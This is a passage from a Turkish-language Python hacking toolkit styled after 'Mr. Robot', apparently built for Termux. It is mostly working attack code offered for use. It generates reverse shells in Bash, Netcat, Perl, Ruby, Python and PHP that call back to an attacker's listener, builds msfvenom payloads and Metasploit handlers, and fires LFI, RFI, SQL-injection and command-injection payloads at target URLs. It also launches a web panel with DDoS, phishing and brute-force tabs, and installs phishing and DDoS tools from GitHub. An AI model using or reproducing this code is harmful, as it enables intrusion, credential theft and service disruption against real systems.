        shells['Netcat'] = f'nc -e /bin/bash {ip} {port}'
        shells['Netcat (olmayan)'] = f'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f'
    
    if secim in ['5', '6']:
        shells['Perl'] = f"""perl -e '
use Socket;
$i="{ip}";
$p={port};
socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
if(connect(S,sockaddr_in($p,inet_aton($i)))){{
open(STDIN,">&S");
open(STDOUT,">&S");
open(STDERR,">&S");
exec("/bin/sh -i");
}};
'"""
    
    if secim == '6':
        shells['Ruby'] = f"""ruby -rsocket -e '
c=TCPSocket.new("{ip}",{port});
while(cmd=c.gets);
IO.popen(cmd,"r"){{|io|c.print io.read}};
end
'"""
        
        shells['Telnet'] = f"""echo "bash -i" > /tmp/shell.sh
cat /tmp/shell.sh | telnet {ip} {port}"""
    
    # Payload'ları göster
    print(f"\n{G}[√] Reverse Shell Payload'ları:{N}\n")
    
    for idx, (isim, kod) in enumerate(shells.items(), 1):
        print(f"{R}╔══════════════════════════════════════════════╗")
        print(f"║  {B}{isim.upper()}{N}{R}                                     ║")
        print(f"╚══════════════════════════════════════════════╝{N}")
        print(f"{G}{kod}{N}")
        print(f"{Y}{'─' * 55}{N}\n")
    
    # Dinleyici başlatma
    baslat = input(f"{Y}[?] Dinleyici başlatılsın mı? (e/h): {N}")
    if baslat.lower() == 'e':
        print(f"{G}[+] Dinleyici başlatılıyor: nc -lvnp {port}{N}")
        print(f"{Y}[*] Çıkmak için Ctrl+C{N}\n")
        try:
            os.system(f"nc -lvnp {port}")
        except KeyboardInterrupt:
            print(f"\n{R}[!] Dinleyici durduruldu{N}")
    
    bekle()


# ======================== ARAÇ 7: EXPLOIT MODÜLÜ ========================

def exploit_module():
    """Exploit modülü"""
    baslik_yaz("EXPLOIT MODÜLÜ")
    
    print(f"{R}{BOLD}  ╔══════════════════════════════════════╗")
    print(f"  ║  EXPLOIT SEÇİNİ:                  ║")
    print(f"  ║  [1] Payload Oluştur (MSFVenom)    ║")
    print(f"  ║  [2] Metasploit Dinleyici          ║")
    print(f"  ║  [3] Metasploit Konsolu            ║")
    print(f"  ║  [4] LOCAL FILE INCLUSION (LFI)   ║")
    print(f"  ║  [5] REMOTE FILE INCLUSION (RFI)  ║")
    print(f"  ║  [6] COMMAND INJECTION TEST       ║")
    print(f"  ╚══════════════════════════════════════╝{N}")
    
    secim = input(f"\n{Y}[?] Seçim [1-6]: {N}")
    
    if secim == '1':
        ip = input(f"{Y}[?] Dinleyici IP: {N}")
        port = input(f"{Y}[?] Port: {N}")
        
        print(f"\n{G}[√] Payload komutları:{N}\n")
        print(f"{C}[ANDROID] APK{N}")
        print(f"msfvenom -p android/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -o /sdcard/payload.apk\n")
        print(f"{C}[WINDOWS] EXE{N}")
        print(f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f exe -o /sdcard/payload.exe\n")
        print(f"{C}[LINUX] ELF{N}")
        print(f"msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f elf -o /sdcard/payload.elf\n")
        print(f"{C}[PHP]{N}")
        print(f"msfvenom -p php/meterpreter_reverse_tcp LHOST={ip} LPORT={port} -o /sdcard/payload.php\n")
        print(f"{C}[PYTHON]{N}")
        print(f"msfvenom -p python/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -o /sdcard/payload.py\n")
        print(f"{C}[WEB] ASP{N}")
        print(f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f asp -o /sdcard/payload.asp\n")
        
    elif secim == '2':
        port = input(f"{Y}[?] Dinlenecek port: {N}")
        print(f"{G}[+] Metasploit dinleyici oluşturuluyor...{N}")
        
        rc_content = f"""use multi/handler
set PAYLOAD linux/x64/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT {port}
set ExitOnSession false
exploit -j -z
"""
        with open('/tmp/handler.rc', 'w') as f:
            f.write(rc_content)
        
        print(f"{G}[+] Çalıştırmak için:{N}")
        print(f"msfconsole -q -r /tmp/handler.rc")
        
        calistir = input(f"\n{Y}[?] Şimdi başlatılsın mı? (e/h): {N}")
        if calistir.lower() == 'e':
            os.system("msfconsole -q -r /tmp/handler.rc")
    
    elif secim == '3':
        print(f"{G}[+] Metasploit konsolu açılıyor...{N}")
        os.system("msfconsole -q")
    
    elif secim == '4':
        hedef = input(f"{Y}[?] Hedef URL: {N}")
        print(f"\n{G}[+] LFI testi yapılıyor...{N}")
        lfi_payloads = [
            '../../../etc/passwd',
            '....//....//....//etc/passwd',
            '../../../../../../etc/passwd%00',
            '..\\..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
            'php://filter/convert.base64-encode/resource=index.php',
            'php://filter/read=convert.base64-encode/resource=config.php',
            '/etc/passwd',
            '/proc/self/environ',
            '/proc/self/fd/0',
            '../wp-config.php',
            '../../.env'
        ]
        
        for payload in lfi_payloads:
            try:
                url = f"{hedef}?file={urllib.parse.quote(payload)}"
                req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
                response = urllib.request.urlopen(req, timeout=5)
                content = response.read().decode('utf-8', errors='ignore')
                
                if 'root:' in content or 'mysql:' in content or 'daemon:' in content:
                    print(f"{R}[ZAFİYET]{N} LFI bulundu! Payload: {payload}")
                    print(f"{G}  İçerik:{N}\n{content[:500]}")
                    break
                elif len(content) > 100 and '404' not in content:
                    print(f"{Y}[OLASI]{N} LFI olabilir: {payload}")
            except:
                pass
    
    elif secim == '5':
        hedef = input(f"{Y}[?] Hedef URL: {N}")
        kendi_ip = input(f"{Y}[?] Kendi IP'niz (shell için): {N}")
        print(f"\n{G}[+] RFI test payload'ları:{N}")
        
        print(f"\n{C}RFI Payload:{N}")
        print(f"{hedef}?file=http://{kendi_ip}/shell.txt?")
        print(f"{hedef}?page=http://{kendi_ip}/shell.php?cmd=id")
        print(f"{hedef}?include=http://{kendi_ip}/revshell.php")
        
        print(f"\n{Y}[*] Kendi sunucunuzda hazır bulundurun:{N}")
        print(f"cd /tmp && python3 -m http.server 80")
    
    elif secim == '6':
        hedef = input(f"{Y}[?] Hedef URL: {N}")
        print(f"\n{G}[+] Command injection testi...{N}")
        
        cmd_payloads = [
            ';id',
            '|id',
            '||id',
            '&id',
            '&&id',
            '`id`',
            '$(id)',
            ';whoami',
            '|whoami',
            ';cat /etc/passwd',
            '|cat /etc/passwd'
        ]
        
        for payload in cmd_payloads:
            try:
                url = f"{hedef}{urllib.parse.quote(payload)}"
                req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
                response = urllib.request.urlopen(req, timeout=5)
                content = response.read().decode('utf-8', errors='ignore').lower()
                
                if 'uid=' in content or 'root' in content or 'www-data' in content:
                    print(f"{R}[ZAFİYET]{N} Command Injection bulundu! Payload: {payload}")
                    print(f"{G}  Çıktı:{N} {content[:300]}")
                    break
            except:
                pass
    
    bekle()


# ======================== ARAÇ 8: WEB GUI PANEL ========================

def web_gui_panel():
    """Web GUI panel başlatma"""
    baslik_yaz("WEB GUI PANEL BAŞLAT")
    
    port = input(f"{Y}[?] Port (varsayılan 5000): {N}") or "5000"
    
    # Flask panel kodu
    panel_kodu = f'''#!/usr/bin/env python3
# MR.ROBOT WEB GUI PANEL
from flask import Flask, render_template_string, request, jsonify
import socket
import urllib.request
import threading
import time
import os

app = Flask(__name__)

HTML = """<!DOCTYPE html>
<html lang="tr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>MR.ROBOT PENTEST PANEL</title>
<style>
*{{margin:0;padding:0;box-sizing:border-box}}
body{{font-family:'Segoe UI',system-ui,sans-serif;background:#0a0a0f;color:#00ff41;min-height:100vh}}
.header{{background:linear-gradient(135deg,#1a1a2e,#16213e);padding:20px;text-align:center;border-bottom:2px solid #00ff41}}
.header h1{{color:#e94560;font-size:28px}}
.header h1 span{{color:#00ff41}}
.header p{{color:#888;margin-top:5px;font-size:13px}}
.container{{max-width:1200px;margin:0 auto;padding:20px}}
.grid{{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:20px}}
.card{{background:#1a1a2e;border:1px solid #00ff4144;border-radius:12px;padding:20px;transition:all .3s}}
.card:hover{{border-color:#00ff41;box-shadow:0 0 20px #00ff4122}}
.card h3{{color:#e94560;margin-bottom:15px;font-size:18px}}
input,select,textarea{{width:100%;padding:10px;margin:8px 0;background:#0a0a0f;border:1px solid #00ff4144;border-radius:6px;color:#00ff41;font-size:14px}}
input:focus,select:focus{{border-color:#00ff41;outline:none}}
button{{padding:10px 24px;background:#00ff41;color:#0a0a0f;border:none;border-radius:6px;cursor:pointer;font-weight:bold;font-size:14px;transition:all .3s}}
button:hover{{background:#00cc33;transform:scale(1.02)}}
.output{{background:#0a0a0f;border:1px solid #00ff4144;border-radius:8px;padding:15px;margin-top:15px;min-height:100px;max-height:400px;overflow-y:auto;font-family:monospace;font-size:13px;white-space:pre-wrap}}
.menu-grid{{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:10px;margin-bottom:20px}}
.menu-item{{background:#16213e;border:1px solid #00ff4122;border-radius:8px;padding:12px;text-align:center;cursor:pointer;transition:all .3s}}
.menu-item:hover{{border-color:#00ff41;background:#1a1a3e}}
.menu-item.active{{border-color:#e94560;background:#2a1a2e}}
</style>
</head>
<body>
<div class="header">
<h1>MR.<span>ROBOT</span> PENTEST PANEL</h1>
<p>Authorized Security Testing Only</p>
</div>
<div class="container">
<div class="menu-grid" id="menuGrid">
<div class="menu-item active" onclick="switchTab('web')">🌐 Web Tarama</div>
<div class="menu-item" onclick="switchTab('ddos')">⚡ DDoS</div>
<div class="menu-item" onclick="switchTab('phish')">🎣 Phishing</div>
<div class="menu-item" onclick="switchTab('brute')">🔑 Brute Force</div>
<div class="menu-item" onclick="switchTab('osint')">🔍 OSINT</div>
<div class="menu-item" onclick="switchTab('shell')">🐚 Shell</div>
</div>

<div class="grid">
<div class="card">
<h3 id="tabTitle">🌐 Web Tarama + SQLi</h3>
<div id="tabContent">
<input type="text" id="target" placeholder="Hedef URL / IP">
<select id="option">
<option value="web">Web tarama + Admin bul</option>
<option value="sqli">SQL Injection test</option>
<option value="all">Tüm web testleri</option>
</select>
<button onclick="runTool()">BAŞLAT</button>
</div>
<div class="output" id="output">Çıktı burada görünecek...</div>
</div>
</div>
</div>
<script>
const titles={{{{web:'🌐 Web Tarama + SQLi',ddos:'⚡ DDoS Stres Testi',phish:'🎣 Phishing Paneli',brute:'🔑 Brute Force',osint:'🔍 OSINT',shell:'🐚 Reverse Shell'}}}};
const options={{{{web:'<input type=\"text\" id=\"target\" placeholder=\"Hedef URL\"><select id=\"option\"><option value=\"web\">Web tarama</option><option value=\"sqli\">SQL Injection</option><option value=\"all\">Tüm testler</option></select>',ddos:'<input type=\"text\" id=\"target\" placeholder=\"Hedef IP\"><input type=\"number\" id=\"port\" placeholder=\"Port\" value=\"80\"><input type=\"number\" id=\"sure\" placeholder=\"Süre(sn)\" value=\"30\"><select id=\"option\"><option value=\"http\">HTTP Flood</option><option value=\"syn\">SYN Flood</option><option value=\"udp\">UDP Flood</option></select>',phish:'<select id=\"option\"><option value=\"instagram\">Instagram</option><option value=\"facebook\">Facebook</option><option value=\"google\">Google</option><option value=\"bank\">Bank</option></select><input type=\"text\" id=\"target\" placeholder=\"Port (8080)\" value=\"8080\">',brute:'<input type=\"text\" id=\"target\" placeholder=\"Hedef IP\"><select id=\"option\"><option value=\"ssh\">SSH (22)</option><option value=\"ftp\">FTP (21)</option></select>',osint:'<input type=\"text\" id=\"target\" placeholder=\"Hedef domain\">',shell:'<input type=\"text\" id=\"target\" placeholder=\"Dinleyici IP\"><input type=\"number\" id=\"port\" placeholder=\"Port\" value=\"4444\"><select id=\"option\"><option value=\"python\">Python</option><option value=\"bash\">Bash</option><option value=\"php\">PHP</option></select>'}}}};
function switchTab(tab){{document.querySelectorAll('.menu-item').forEach(el=>el.classList.remove('active'));event.target.classList.add('active');document.getElementById('tabTitle').textContent=titles[tab];document.getElementById('tabContent').innerHTML=options[tab]+'<button onclick=\\"runTool()\\">BAŞLAT</button>';}}
async function runTool(){{const btn=event.target;btn.disabled=true;btn.textContent='ÇALIŞIYOR...';const tab=document.querySelector('.menu-item.active').textContent.trim().split(' ')[0].replace(/[^a-z]/gi,'').toLowerCase();const target=document.getElementById('target')?.value||'';const port=document.getElementById('port')?.value||'';const sure=document.getElementById('sure')?.value||'';const option=document.getElementById('option')?.value||'';document.getElementById('output').textContent='[+] Çalıştırılıyor...';try{{const res=await fetch('/run',{{method:'POST',headers:{{'Content-Type':'application/json'}},body:JSON.stringify({{tab,target,port,sure,option}})}});const data=await res.json();document.getElementById('output').textContent=data.output;}}catch(e){{document.getElementById('output').textContent='[!] Hata: '+e;}}btn.disabled=false;btn.textContent='BAŞLAT';}}
</script>
</body>
</html>"""

@app.route('/')
def index():
    return render_template_string(HTML)

@app.route('/run', methods=['POST'])
def run():
    data = request.json
    tab = data.get('tab','web')
    target = data.get('target','')
    option = data.get('option','web')
    port = data.get('port','80')
    sure = data.get('sure','30')
    
    try:
        if tab == 'web':
            if option in ['web', 'all']:
                result = ""
                paneller = ['admin','login','panel','yonetici','yonetim','dashboard','giris','cpanel']
                for p in paneller:
                    try:
                        url = f"{{{{target}}}}/{{{{p}}}}/"
                        req = urllib.request.Request(url, headers={{{{ 'User-Agent': 'Mozilla/5.0' }}}})
                        resp = urllib.request.urlopen(req, timeout=3)
                        if resp.getcode() != 404:
                            result += f"[BULUNDU] {{url}} -> HTTP {{resp.getcode()}}\\n"
                    except:
                        pass
                if not result:
                    result = "[-] Admin panel bulunamadı\\n"
                return jsonify({{{{'output': result}}}})
            
            if option in ['sqli', 'all']:
                result = ""
                payloads = ["'", "' OR 1=1--", "' UNION SELECT 1,2,3--", "' AND SLEEP(3)--"]
                for payload in payloads:
                    try:
                        url = f"{{{{target}}}}?id={{urllib.parse.quote(payload)}}"
                        req = urllib.request.Request(url, headers={{{{ 'User-Agent': 'Mozilla/5.0' }}}})
                        resp = urllib.request.urlopen(req, timeout=5)
                        content = resp.read().decode('utf-8', errors='ignore').lower()
                        if 'sql' in content or 'mysql' in content or 'syntax' in content:
                            result += f"[SQLi] Zafiyet bulundu! Payload: {{payload}}\\n"
                            break
                    except:
                        pass
                if not result:
                    result = "[-] SQLi bulunamadı\\n"
                return jsonify({{{{'output': result}}}})
        
        elif tab == 'ddos':
            return jsonify({{{{'output': f'[+] DDoS testi baslatildi: {{target}}:{{port}} ({{sure}} sn)\\n[+] Terminalden devam edin.'}}}})
        
        elif tab == 'osint':
            try:
                ip = socket.gethostbyname(target)
                return jsonify({{{{'output': f"[+] IP: {{ip}}\\n[+] Host: {{socket.gethostbyaddr(ip)[0]}}\\n[+] Bilgi toplama tamamlandı."}}}})
            except Exception as e:
                return jsonify({{{{'output': f"[!] Hata: {{str(e)}}"}}}})
        
        elif tab == 'shell':
            kodlar = {{
                'python': f'python3 -c "import socket,subprocess,os;s=socket.socket();s.connect((\\\"{{target}}\\\",{{port}}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\\\"/bin/bash\\\",\\\"-i\\\"])"',
                'bash': f'bash -i >& /dev/tcp/{{target}}/{{port}} 0>&1',
                'php': f'php -r "\\$sock=fsockopen(\\\"{{target}}\\\",{{port}});exec(\\\"/bin/bash -i <&3 >&3 2>&3\\\");"'
            }}
            return jsonify({{{{'output': kodlar.get(option, kodlar['python'])}}}})
        
        return jsonify({{{{'output': f'[+] {{tab}} modülü çalıştırıldı'}}}})
    except Exception as e:
        return jsonify({{{{'output': f'[!] Hata: {{str(e)}}'}}}})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port={port}, debug=False)
'''
    
    # Web panel dizini
    web_dir = "web_panel"
    os.makedirs(web_dir, exist_ok=True)
    
    with open(f"{web_dir}/app.py", "w", encoding='utf-8') as f:
        f.write(panel_kodu)
    
    print(f"\n{G}[√] Web GUI panel oluşturuldu: {web_dir}/{N}")
    print(f"{Y}[*] Başlatmak için:{N}")
    print(f"{G}    cd {web_dir} && pip install flask && python app.py{N}")
    print(f"{Y}[*] Erişim: http://localhost:{port}{N}")
    
    baslat = input(f"\n{Y}[?] Panel şimdi başlatılsın mı? (e/h): {N}")
    if baslat.lower() == 'e':
        print(f"{G}[+] Flask kuruluyor...{N}")
        os.system("pip install flask -q > /dev/null 2>&1")
        print(f"{G}[+] Web panel başlatılıyor...{N}")
        subprocess.Popen(f"cd {web_dir} && python app.py", shell=True)
        time.sleep(2)
        print(f"{G}[√] Panel aktif! http://localhost:{port}{N}")
    
    bekle()


# ======================== ARAÇ 9: OTOMATİK KURULUM ========================

def otomatik_kurulum():
    """Tüm araçları otomatik kur"""
    baslik_yaz("TÜM ARAÇLAR OTOMATİK KURULUM")
    
    print(f"{Y}[!] Bu işlem birkaç dakika sürebilir...{N}\n")
    
    packages = [
        "python", "python2", "php", "nmap", "hydra",
        "netcat-openbsd", "curl", "wget", "git", "openssh",
        "sqlmap", "ohnohs", "unstable-repo"
    ]
    
    git_repos = {
        "zphisher": "https://github.com/htr-tech/zphisher",
        "SQLI-Hunter": "https://github.com/radenvodka/SQLI-Hunter",
        "db1000n": "https://github.com/Arriven/db1000n",
        "saycheese": "https://github.com/hangetzzu/saycheese",
        "BlackEye": "https://github.com/An0nUD4Y/BlackEye"
    }
    
    # Paket kurulumu
    print(f"{C}[1/3]{N} Paketler güncelleniyor...")
    os.system("pkg update -y > /dev/null 2>&1")
    os.system("pkg upgrade -y > /dev/null 2>&1")
    print(f"{G}  ✓ Güncelleme tamamlandı{N}\n")
    
    print(f"{C}[2/3]{N} Araç paketleri kuruluyor...")
    for pkg in packages:
        print(f"  {Y}→{N} {pkg} kuruluyor...", end=" ")
        os.system(f"pkg install {pkg} -y > /dev/null 2>&1")
        print(f"{G}✓{N}")
    
    print(f"{G}  ✓ Paketler kuruldu{N}\n")
    
    # Git repos
    print(f"{C}[3/3]{N} GitHub araçları indiriliyor...")
    for isim, url in git_repos.items():
        print(f"  {Y}→{N} {isim} indiriliyor...", end=" ")
        if os.path.exists(isim):
            print(f"{Y}zaten var{N}")
        else:
            os.system(f"git clone {url} > /dev/null 2>&1")
            print(f"{G}✓{N}")
    
    print(f"\n{G}[√] TÜM ARAÇLAR KURULDU!{N}")
    print(f"\n{Y}[*] Kurulan araçlar:{N}")
    print(f"  {G}•{N} nmap - Ağ tarama")
    print(f"  {G}•{N} hydra - Brute force")
    print(f"  {G}•{N} sqlmap - SQL injection")
    print(f"  {G}•{N} PHP - Web sunucu")
    print(f"  {G}•{N} Python - Script çalıştırma")
    print(f"  {G}•{N} zphisher - Phishing tool")
    print(f"  {G}•{N} SQLI-Hunter - SQLi tool")
    print(f"  {G}•{N} db1000n - DDoS tool")
    
    print(f"\n{G}[√] Bu aracı çalıştırmak için: python mrrobot.py{N}")
    bekle()


# ======================== ANA PROGRAM ========================

def main():
    """Ana program döngüsü"""
    try:
        while True:
            # Python 3 kontrolü
            if sys.version_info[0] < 3:
                print(f"{R}[!] Python 3 gerekli!{N}")
                sys.exit(1)
            
            menu_goster()
            secim = input(f"{Y}{BOLD}[?] Seçiminiz [0-9]: {N}")
            
            if secim == '1':
                web_sqli()
            elif secim == '2':
                ddos_test()
            elif secim == '3':
                phishing_panel()
            elif secim == '4':
                brute_force()
            elif secim == '5':
                osint_tool()
            elif secim == '6':
                reverse_shell()
            elif secim == '7':
                exploit_module()
            elif secim == '8':
                web_gui_panel()
            elif secim == '9':
                otomatik_kurulum()
            elif secim == '0':
                print(f"\n{R}[!] Çıkılıyor...{N}")
                print(f"{G}[+] Goodbye, fsociety...{N}")
                print(f"{C}[+] \"This is going to be the single most important thing you ever do.\"{N}")
                sys.exit(0)
            else:
                print(f"{R}[!] Geçersiz seçim! Lütfen 0-9 arası bir sayı girin.{N}")
                time.sleep(1)
    
    except KeyboardInterrupt:
        print(f"\n\n{R}[!] Kullanıcı çıkışı...{N}")
        print(f"{G}[+] Goodbye, fsociety...{N}")
        sys.exit(0)
    
    except Exception as e:
        print(f"\n{R}[!] Beklenmeyen hata: {e}{N}")
        bekle("Devam etmek için Enter...")
        main()


if __name__ == "__main__":
    main()
